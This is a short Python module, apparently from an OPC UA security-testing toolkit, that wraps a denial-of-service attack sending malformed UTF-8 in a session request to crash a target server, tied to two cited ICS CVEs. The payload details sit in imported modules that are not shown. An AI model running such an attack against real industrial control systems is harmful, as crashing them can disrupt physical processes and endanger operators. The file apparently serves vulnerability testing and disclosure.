# Malformed UTF-8 Attack
#   Triggering a application crash after processing malformed UTF8 strings
#
# CVEs:
#   - CVE-2022-2848: https://www.cisa.gov/uscert/ics/advisories/icsa-22-242-10
#   - CVE-2022-2825: https://www.cisa.gov/uscert/ics/advisories/icsa-22-242-10
#

import datetime

from protocol import *
from config import *

def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session(create_malformed_utf8_session=True)
